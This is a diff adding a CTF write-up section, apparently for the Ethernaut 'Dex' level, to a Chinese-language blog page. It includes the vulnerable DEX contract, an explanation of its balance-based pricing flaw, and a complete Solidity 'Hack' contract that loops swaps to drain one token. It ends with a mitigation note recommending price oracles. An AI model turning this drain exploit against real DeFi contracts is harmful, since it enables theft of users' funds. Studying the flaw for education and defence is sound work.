@@ -2641,6 +2641,13 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#22-dex" class="md-nav__link">
+    22. Dex
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3236,6 +3243,13 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#22-dex" class="md-nav__link">
+    22. Dex
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3264,6 +3278,8 @@
         <a href="#blockchain" class="blogging-tag"><code>#blockchain</code></a>
 
         <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
+
+        <a href="#solidity" class="blogging-tag"><code>#solidity</code></a>
 
     </div>
 
@@ -4844,13 +4860,121 @@ f3  // return
 </code></pre></div>
 </li>
 </ul>
+<h2 id="22-dex">22. Dex<a class="headerlink" href="#22-dex" title="Permanent link">&para;</a></h2>
+<ul>
+<li>至少清空 <a href="https://en.wikipedia.org/wiki/Decentralized_exchange">DEX</a> 合约中的一种代币</li>
+<li>合约 <code>Dex</code> 每种代币初始各 100 枚，玩家每种代币初始各 10 枚</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span><span class="w"></span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span><span class="w"></span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<span class="k">import</span><span class="w"> </span><span class="s1">&#39;openzeppelin-contracts-08/access/Ownable.sol&#39;</span><span class="p">;</span><span class="w"></span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Dex</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token1</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token2</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTokens</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token2</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token2</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">addLiquidity</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token_address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token_address</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">require</span><span class="p">((</span><span class="kr">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token2</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="kr">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token2</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token1</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Invalid tokens&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not enough to swap&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">swapAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="p">((</span><span class="nx">amount</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">/</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">SwappableToken</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="nx">SwappableToken</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">account</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">account</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">SwappableToken</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_dex</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">)</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="nx">_dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">owner</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">_dex</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;InvalidApprover&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">super</span><span class="p">.</span><span class="nx">_approve</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li>梳理合约 <code>Dex</code> 提供的代币互换方式<ul>
+<li>根据要交换的 <code>from</code> 代币的数量 <code>amount</code>、<code>Dex</code> 合约 <code>from</code> 和 <code>to</code> 代币的余额计算交换得到 <code>to</code> 代币的数量 <code>swapAmount</code>，即 <code>swapAmount = amount * to.balance / from.balance</code></li>
+<li>将要交换的 <code>from</code> 代币存入 <code>Dex</code> 合约，<code>swapAmount</code> 数量的 <code>to</code> 代币从 <code>Dex</code> 合约转出</li>
+</ul>
+</li>
+<li>若首先将 10 枚 <code>token1</code> 转换为 <code>token2</code>，此时 <code>swapAmount</code> 为 10，<code>Dex</code> 合约 <code>token1</code> 的余额变为 110、<code>token2</code> 的余额变为 90，玩家将持有 20 枚 <code>token2</code> 代币，再将全部 <code>token2</code> 转为 <code>token1</code>，此时 <code>swapAmount</code> 提高到 24，可见不断进行代币互换即可清空 <code>Dex</code> 合约中的一种代币</li>
+<li>
+<p>部署合约 <code>Hack</code>，并授权使用代币 <code>&gt;&gt; contract.approve("&lt;hack-address&gt;", 10)</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">Dex</span><span class="w"> </span><span class="nx">dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Dex</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">token1</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">token2</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span><span class="w">  </span><span class="c1">// 将持有的代币全部用于交换</span><span class="w"></span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">                </span><span class="c1">// 除第一次交换外，合约 Dex 的 to 代币的余额必为 110</span><span class="w"></span>
+<span class="w">                </span><span class="c1">// 当 swapAmount 大于 Dex 合约 to 代币的余额时，说明本次交换能够清空 to 代币</span><span class="w"></span>
+<span class="w">                </span><span class="c1">// 即可以获得 110 枚 to 代币，那么参与交换的 from 代币的数量应为</span><span class="w"></span>
+<span class="w">                </span><span class="c1">// 110 * from.balance / to.balance = 110 * from.balance / 110 = from.balance</span><span class="w"></span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="p">}</span><span class="w"></span>
+<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="p">}</span><span class="w"></span>
+<span class="w">            </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">                </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span><span class="w"></span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="p">}</span><span class="w"></span>
+<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</li>
+<li>
+<p>不应从单个来源获取价格或其它数据，可以借助于 Oracles，如 <a href="https://docs.chain.link/docs/get-the-latest-price">Chainlink Data Feeds</a></p>
+</li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">November 29, 2022 20:10:00</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">December 19, 2022 21:26:42</span>
       
     
   </small>
